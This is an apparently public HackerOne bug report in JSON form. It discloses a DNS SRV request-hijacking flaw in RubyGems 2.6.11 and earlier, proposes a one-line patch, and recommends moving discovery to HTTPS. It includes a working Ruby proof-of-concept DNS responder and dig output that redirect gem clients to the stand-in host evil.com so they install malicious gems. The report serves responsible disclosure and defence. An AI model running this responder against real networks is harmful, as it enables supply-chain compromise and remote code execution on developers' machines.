{
  "id": 218088,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTgwODg=",
  "url": "https://hackerone.com/reports/218088",
  "title": "Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-04-02T17:31:05.933Z",
  "submitted_at": "2017-04-02T17:31:05.933Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "claudijd",
    "url": "/claudijd",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8212,
    "url": "https://hackerone.com/rubygems",
    "handle": "rubygems",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "RubyGems",
      "twitter_handle": "rubygems_status",
      "website": "https://rubygems.org",
      "about": "RubyGems.org is the Ruby communityâ€™s gem hosting service."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2017-0902",
    "CVE-2015-3900",
    "CVE-2015-4020"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-08-30T23:36:42.991Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2017-08-28T16:41:24.208Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned \nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\t\n    RubyDNS::run_server(:listen => INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Recommendations:**\n\nConsider this small patch to address the immediate attack vector...\n\n    -      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n    +      if (/\\.#{Regexp.quote(host)}\\z/ =~ target) && !target.include?(\"/\")\n\nAlso, consider moving away from doing API discovery via DNS.  Would recommend \nmoving to HTTPS, where you will have a stronger transport security chain.\n\n**References (these are not new, just references prior work here to help triage team understand impact):**\n\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\n- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\n- https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\n- http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-09-27T16:41:24.243Z",
  "allow_singular_disclosure_after": -201297417.3929363,
  "singular_disclosure_allowed": true,
  "vote_count": 10,
  "voters": [
    "sp1d3rs",
    "jobert",
    "ysx",
    "claudijd",
    "geeknik",
    "r3y",
    "eveeez",
    "marwan",
    "corycomplex",
    "sonalkr132"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
